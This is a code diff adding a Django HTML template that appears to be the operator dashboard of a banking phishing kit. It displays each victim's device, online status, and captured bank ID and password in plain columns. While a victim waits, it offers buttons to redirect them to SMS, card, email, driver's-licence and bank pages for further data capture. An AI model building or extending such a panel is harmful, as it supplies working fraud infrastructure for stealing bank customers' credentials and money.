@@ -1,0 +1,53 @@
+<table class="table table-bordered table-striped ">
+    <thead>
+    <tr>
+        <th scope="col">Client ID</th>
+        <th scope="col">User agent</th>
+        <th scope="col">Client ID</th>
+        <th scope="col">Password</th>
+        <th scope="col">Last redirect</th>
+        <th scope="col">Last seen</th>
+        <th scope="col">Action</th>
+    </tr>
+    </thead>
+    <tbody>
+    {% for client in clients %}
+        <tr id="client_{{ client.id }}" {% if client.is_waiting %}style="background: #ffbaba" {% endif %}>
+            <th scope="row">
+                {% if client.is_online %}
+                    <span style="font-size: 10px" class="badge badge-success">on</span>
+                {% else %}
+                    <span style="font-size: 10px" class="badge badge-danger">off</span>
+                {% endif %}
+                <a style="font-size: 15px" class="badge badge-secondary" target="_blank" href="{% url 'client'  client.pk %}">Client {{ client.pk }}</a>
+                            <input onclick="ToDeleteListChanger({{ client.id }})" style="width: 15px; height: 15px" type="checkbox">
+            </th>
+            <td>{{ client.device }}</td>
+            <td>{{ client.clientlogin_set.last.bank_id }}</td>
+            <td>{{ client.clientlogin_set.last.password }}</td>
+            <td>{{ client.last_redirect }}</td>
+            <td>{{ client.last_action|date:'H:i d/m' }}</td>
+            <td>
+                {% if client.is_waiting %}
+                    <div class="btn-group">
+                        <button class="btn btn-secondary btn-sm dropdown-toggle" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                            Redirect to
+                        </button>
+                        <div class="dropdown-menu">
+                            <button onclick="call_request(this)" data-page="profile" data-client="{{ client.uuid }}" class="dropdown-item" >Profile</button>
+                            <button onclick="call_request(this)" data-page="sms" data-client="{{ client.uuid }}" class="dropdown-item">SMS</button>
+                            <button onclick="call_request(this)" data-page="card" data-client="{{ client.uuid }}" class="dropdown-item">Card</button>
+                            <button onclick="call_request(this)" data-page="email" data-client="{{ client.uuid }}" class="dropdown-item">Email</button>
+                            <button onclick="call_request(this)" data-page="complete" data-client="{{ client.uuid }}" class="dropdown-item">Complete</button>
+                            <button onclick="call_request(this)" data-page="driver" data-client="{{ client.uuid }}" class="dropdown-item">Driver</button>
+                            <button onclick="call_request(this)" data-page="bank" data-client="{{ client.uuid }}" class="dropdown-item">Bank</button>
+                        </div>
+                    </div>
+                {% else %}
+                    <button onclick="delete_client(this)" data-client="{{ client.id }}" class="btn btn-outline-danger btn-sm">del</button>
+                {% endif %}
+            </td>
+        </tr>
+    {% endfor %}
+    </tbody>
+</table>
